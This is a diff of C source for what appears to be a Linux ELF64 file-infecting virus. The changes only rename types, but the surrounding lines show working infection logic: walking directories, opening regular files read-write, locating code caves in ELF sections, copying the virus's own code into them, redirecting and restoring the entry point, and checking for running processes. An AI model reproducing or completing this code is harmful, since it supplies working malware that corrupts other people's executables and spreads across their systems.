@@ -29,23 +29,23 @@ typedef struct {
     unsigned short d_reclen;
     unsigned char d_type;
     char d_name[];
-} dirent64;
+} Dirent64;
 
 typedef struct {
     void *mem;
     uint64_t size;
-} file;
+} File;
 
 typedef struct {
     uint64_t start;
     uint64_t size;
     uint8_t is_executable;
-} code_cave;
+} CodeCave;
 
 typedef struct {
     uint64_t start;
     uint64_t size;
-} entry;
+} Entry;
 
 __attribute__((always_inline)) inline long sys(long n, long arg1, long arg2, long arg3, long arg4, long arg5, long arg6);
 __attribute__((always_inline)) inline void ft_exit(int exit_code);
@@ -59,27 +59,27 @@ __attribute__((always_inline)) inline uint64_t ft_mmap(void *addr, size_t length
 __attribute__((always_inline)) inline int64_t ft_munmap(void *addr, size_t length);
 
 __attribute__((always_inline)) static inline int infect_dir(volatile char *dir_path, volatile int fd_self);
-__attribute__((always_inline)) static inline int infect_file(volatile char *path, volatile file *file_self);
-__attribute__((always_inline)) inline int file_mmap(int fd, volatile file *file);
-__attribute__((always_inline)) inline int file_munmap(volatile file *file);
+__attribute__((always_inline)) static inline int infect_file(volatile char *path, volatile File *file_self);
+__attribute__((always_inline)) inline int file_mmap(int fd, volatile File *file);
+__attribute__((always_inline)) inline int file_munmap(volatile File *file);
 __attribute__((always_inline)) inline int elf64_ident_check(volatile const Elf64_Ehdr *header);
-__attribute__((always_inline)) inline Elf64_Shdr *get_next_section_header(uint64_t section_cur_end, file file);
-__attribute__((always_inline)) inline int code_caves_get(volatile code_cave *code_caves, volatile file *file);
-__attribute__((always_inline)) inline uint64_t addr_to_offset(volatile file *file, volatile uint64_t addr);
-__attribute__((always_inline)) inline uint64_t code_caves_size_sum(volatile code_cave code_caves[], volatile uint64_t code_cave_num);
-__attribute__((always_inline)) inline uint64_t entries_size_sum(volatile entry entries[], volatile uint64_t entries_num);
-__attribute__((always_inline)) inline uint64_t reserve_builder(volatile file *file_target, volatile void *builder_self_start,
-                                                               volatile uint64_t builder_self_size, volatile code_cave *code_caves_target,
+__attribute__((always_inline)) inline Elf64_Shdr *get_next_section_header(uint64_t section_cur_end, File file);
+__attribute__((always_inline)) inline int code_caves_get(volatile CodeCave *code_caves, volatile File *file);
+__attribute__((always_inline)) inline uint64_t addr_to_offset(volatile File *file, volatile uint64_t addr);
+__attribute__((always_inline)) inline uint64_t code_caves_size_sum(volatile CodeCave code_caves[], volatile uint64_t code_cave_num);
+__attribute__((always_inline)) inline uint64_t entries_size_sum(volatile Entry entries[], volatile uint64_t entries_num);
+__attribute__((always_inline)) inline uint64_t reserve_builder(volatile File *file_target, volatile void *builder_self_start,
+                                                               volatile uint64_t builder_self_size, volatile CodeCave *code_caves_target,
                                                                volatile uint64_t code_caves_target_num);
-__attribute__((always_inline)) inline uint64_t reserve_scaffol_table(volatile file *file_target, volatile code_cave *code_caves_target,
+__attribute__((always_inline)) inline uint64_t reserve_scaffol_table(volatile File *file_target, volatile CodeCave *code_caves_target,
                                                                      volatile uint64_t code_caves_target_num);
-__attribute__((always_inline)) inline uint64_t copy_entries_into_code_caves(volatile entry *entries_target, volatile entry *entries_self,
-                                                                            volatile uint64_t entries_self_num, volatile file *file_self,
-                                                                            volatile file *file_target, volatile code_cave *code_caves_target,
+__attribute__((always_inline)) inline uint64_t copy_entries_into_code_caves(volatile Entry *entries_target, volatile Entry *entries_self,
+                                                                            volatile uint64_t entries_self_num, volatile File *file_self,
+                                                                            volatile File *file_target, volatile CodeCave *code_caves_target,
                                                                             volatile uint64_t code_caves_target_num);
-__attribute__((always_inline)) inline uint64_t offset_to_addr(volatile file *file, volatile uint64_t offset);
-__attribute__((always_inline)) inline int file_write(int fd, volatile file *file);
-__attribute__((always_inline)) inline uint64_t old_entry_get(volatile file *file);
+__attribute__((always_inline)) inline uint64_t offset_to_addr(volatile File *file, volatile uint64_t offset);
+__attribute__((always_inline)) inline int file_write(int fd, volatile File *file);
+__attribute__((always_inline)) inline uint64_t old_entry_get(volatile File *file);
 
 __attribute__((always_inline)) inline int ft_strlen(volatile char *str);
 __attribute__((always_inline)) inline void ft_strncpy(volatile char *src, volatile char *dst, size_t size);
@@ -201,7 +201,7 @@ bad_process_running() {
             for (int i = 6; i < sizeof(path); ++i) {
                 path[i] = 0;
             }
-            volatile dirent64 *entry = (dirent64 *)(getdents_buf + offset);
+            volatile Dirent64 *entry = (Dirent64 *)(getdents_buf + offset);
             offset += entry->d_reclen;
             if (!ft_isdigit(entry->d_name)) {
                 continue;
@@ -305,7 +305,7 @@ get_base_address() {
 
 __attribute__((always_inline)) static inline void
 jump_back(int fd_self) {
-    volatile file file_self;
+    volatile File file_self;
 
     file_mmap(fd_self, &file_self);
 
@@ -359,11 +359,11 @@ infect_dir(volatile char *dir_path, volatile int fd_self) {
         if (fd_dir < 0) return 0;
 
         const uint64_t FILE_NAME_MAX = 255;
-        const uint64_t DIR_P_SIZE_WITHOUT_ALIGNMENT = FILE_NAME_MAX + sizeof(dirent64);
+        const uint64_t DIR_P_SIZE_WITHOUT_ALIGNMENT = FILE_NAME_MAX + sizeof(Dirent64);
         const uint64_t ALINMENT = 8;
         const uint64_t DIR_P_SIZE = DIR_P_SIZE_WITHOUT_ALIGNMENT + DIR_P_SIZE_WITHOUT_ALIGNMENT % ALINMENT;
 
-        volatile file file_self;
+        volatile File file_self;
         char dirp[DIR_P_SIZE];
         int bytes_read = 0;
         do {
@@ -373,7 +373,7 @@ infect_dir(volatile char *dir_path, volatile int fd_self) {
                 return 1;
             }
 
-            dirent64 *dirent_cur = (dirent64 *)dirp;
+            Dirent64 *dirent_cur = (Dirent64 *)dirp;
             while ((((long)dirent_cur) - (long)dirp) < bytes_read) {
                 if (dirent_cur->d_type == DT_REG) {
                     volatile char full_path[ft_strlen(dirent_cur->d_name) + ft_strlen(dir_path) + 1 + 1];
@@ -385,7 +385,7 @@ infect_dir(volatile char *dir_path, volatile int fd_self) {
                     infect_file(full_path, &file_self);
                     file_munmap(&file_self);
                 }
-                dirent_cur = (dirent64 *)((void *)dirent_cur + dirent_cur->d_reclen);
+                dirent_cur = (Dirent64 *)((void *)dirent_cur + dirent_cur->d_reclen);
             }
         } while (bytes_read > 0);
 
@@ -397,11 +397,11 @@ infect_dir(volatile char *dir_path, volatile int fd_self) {
 }
 
 __attribute__((always_inline)) inline int
-infect_file(volatile char *path, volatile file *file_self) {
+infect_file(volatile char *path, volatile File *file_self) {
     int fd_target = ft_open(path, O_RDWR, 0);
     if (fd_target < 0) return (1);
 
-    volatile file file_target;
+    volatile File file_target;
     if (file_mmap(fd_target, &file_target)) {
         ft_close(fd_target);
         return 1;
@@ -420,7 +420,7 @@ infect_file(volatile char *path, volatile file *file_self) {
         return 0;
     }
 
-    volatile code_cave code_caves_target[100];
+    volatile CodeCave code_caves_target[100];
     uint64_t code_caves_target_num = code_caves_get(code_caves_target, &file_target);
 
     volatile Elf64_Ehdr *header_self = file_self->mem;
@@ -430,7 +430,7 @@ infect_file(volatile char *path, volatile file *file_self) {
     uint64_t *builder_self_table_start = builder_self_start + builder_self_size - 16;
     uint64_t *builder_self_table_size = builder_self_start + builder_self_size - 8;
 
-    volatile entry *entries_self = file_self->mem + *builder_self_table_start;
+    volatile Entry *entries_self = file_self->mem + *builder_self_table_start;
     uint64_t entries_self_num = *builder_self_table_size;
     uint64_t provided_space = code_caves_size_sum(code_caves_target, code_caves_target_num);
     uint64_t needed_space_table = code_caves_target_num * 16;
@@ -494,7 +494,7 @@ infect_file(volatile char *path, volatile file *file_self) {
 }
 
 __attribute__((always_inline)) inline int
-file_write(int fd, volatile file *file) {
+file_write(int fd, volatile File *file) {
     uint64_t off = ft_lseek(fd, 0, SEEK_SET);
     if (off == -1) return 1;
 
@@ -503,7 +503,7 @@ file_write(int fd, volatile file *file) {
 }
 
 __attribute__((always_inline)) inline int
-file_mmap(int fd, volatile file *file) {
+file_mmap(int fd, volatile File *file) {
     uint64_t off = ft_lseek(fd, 0, SEEK_END);
     if (off == -1) return 1;
     file->size = off;
@@ -517,21 +517,21 @@ file_mmap(int fd, volatile file *file) {
 }
 
 __attribute__((always_inline)) inline int
-file_munmap(volatile file *file) {
+file_munmap(volatile File *file) {
     return ft_munmap(file->mem, file->size);
 }
 
 __attribute__((always_inline)) inline uint64_t
-copy_entries_into_code_caves(volatile entry *entries_target, volatile entry *entries_self, volatile uint64_t entries_self_num, volatile file *file_self,
-                             volatile file *file_target, volatile code_cave *code_caves_target, volatile uint64_t code_caves_target_num) {
+copy_entries_into_code_caves(volatile Entry *entries_target, volatile Entry *entries_self, volatile uint64_t entries_self_num, volatile File *file_self,
+                             volatile File *file_target, volatile CodeCave *code_caves_target, volatile uint64_t code_caves_target_num) {
     uint64_t entry_self_index = 0;
     for (int cave_index = 0; cave_index < code_caves_target_num; cave_index++) {
-        volatile code_cave *cave = code_caves_target + cave_index;
-        volatile entry *entry_target = entries_target + cave_index;
+        volatile CodeCave *cave = code_caves_target + cave_index;
+        volatile Entry *entry_target = entries_target + cave_index;
         entry_target->start = cave->start;
         while (cave->size > 0) {
 
-            volatile entry *entry_self = entries_self + entry_self_index;
+            volatile Entry *entry_self = entries_self + entry_self_index;
             if (cave->size >= entry_self->size) {
                 ft_memcpy(file_self->mem + entry_self->start, file_target->mem + cave->start, entry_self->size);
                 cave->start += entry_self->size;
@@ -554,7 +554,7 @@ copy_entries_into_code_caves(volatile entry *entries_target, volatile entry *ent
 }
 
 __attribute__((always_inline)) inline uint64_t
-old_entry_get(volatile file *file) {
+old_entry_get(volatile File *file) {
     Elf64_Ehdr *header = file->mem;
 
     uint64_t builder_start_offset = addr_to_offset(file, header->e_entry);
@@ -567,9 +567,9 @@ old_entry_get(volatile file *file) {
 }
 
 __attribute__((always_inline)) inline uint64_t
-reserve_scaffol_table(volatile file *file_target, volatile code_cave *code_caves_target, volatile uint64_t code_caves_target_num) {
+reserve_scaffol_table(volatile File *file_target, volatile CodeCave *code_caves_target, volatile uint64_t code_caves_target_num) {
     for (int i = 0; i < code_caves_target_num; i++) {
-        volatile code_cave *cave = code_caves_target + i;
+        volatile CodeCave *cave = code_caves_target + i;
         if (cave->size >= code_caves_target_num * 16) {
             cave->start += code_caves_target_num * 16;
             cave->size -= code_caves_target_num * 16;
@@ -580,11 +580,11 @@ reserve_scaffol_table(volatile file *file_target, volatile code_cave *code_caves
 }
 
 __attribute__((always_inline)) inline uint64_t
-reserve_builder(volatile file *file_target, volatile void *builder_self_start, volatile uint64_t builder_self_size, volatile code_cave *code_caves_target,
+reserve_builder(volatile File *file_target, volatile void *builder_self_start, volatile uint64_t builder_self_size, volatile CodeCave *code_caves_target,
                 volatile uint64_t code_caves_target_num) {
     uint8_t big_enough_builder_space = 0;
     for (int i = 0; i < code_caves_target_num; i++) {
-        volatile code_cave *cave = code_caves_target + i;
+        volatile CodeCave *cave = code_caves_target + i;
         if (cave->is_executable)
             if (cave->size >= builder_self_size) {
                 ft_memcpy(builder_self_start, file_target->mem + cave->start, builder_self_size);
@@ -683,7 +683,7 @@ elf64_ident_check(volatile const Elf64_Ehdr *header) {
 }
 
 __attribute__((always_inline)) inline int
-code_caves_get(volatile code_cave *code_caves, volatile file *file) {
+code_caves_get(volatile CodeCave *code_caves, volatile File *file) {
     Elf64_Shdr *section_header = NULL;
     Elf64_Ehdr *header = file->mem;
     uint64_t section_cur_end = header->e_phoff + header->e_phentsize * header->e_phnum;
@@ -717,7 +717,7 @@ code_caves_get(volatile code_cave *code_caves, volatile file *file) {
 }
 
 __attribute__((always_inline)) inline Elf64_Shdr *
-get_next_section_header(uint64_t section_cur_end, file file) {
+get_next_section_header(uint64_t section_cur_end, File file) {
     Elf64_Ehdr *header = file.mem;
     Elf64_Shdr *section_header_table = file.mem + header->e_shoff;
 
@@ -737,7 +737,7 @@ get_next_section_header(uint64_t section_cur_end, file file) {
 }
 
 inline uint64_t
-offset_to_addr(volatile file *file, volatile uint64_t offset) {
+offset_to_addr(volatile File *file, volatile uint64_t offset) {
     Elf64_Ehdr *header = file->mem;
 
     Elf64_Phdr *program_header_table = file->mem + header->e_phoff;
@@ -751,7 +751,7 @@ offset_to_addr(volatile file *file, volatile uint64_t offset) {
 }
 
 inline uint64_t
-addr_to_offset(volatile file *file, volatile uint64_t addr) {
+addr_to_offset(volatile File *file, volatile uint64_t addr) {
     Elf64_Ehdr *header = file->mem;
 
     Elf64_Phdr *program_header_table = file->mem + header->e_phoff;
@@ -765,7 +765,7 @@ addr_to_offset(volatile file *file, volatile uint64_t addr) {
 }
 
 inline uint64_t
-code_caves_size_sum(volatile code_cave code_caves[], volatile uint64_t code_cave_num) {
+code_caves_size_sum(volatile CodeCave code_caves[], volatile uint64_t code_cave_num) {
     uint64_t total = 0;
     for (int i = 0; i < code_cave_num; i++)
         total += code_caves[i].size;
@@ -773,7 +773,7 @@ code_caves_size_sum(volatile code_cave code_caves[], volatile uint64_t code_cave
 }
 
 inline uint64_t
-entries_size_sum(volatile entry entries[], volatile uint64_t entries_num) {
+entries_size_sum(volatile Entry entries[], volatile uint64_t entries_num) {
     uint64_t total = 0;
     for (int i = 0; i < entries_num; i++)
         total += entries[i].size;
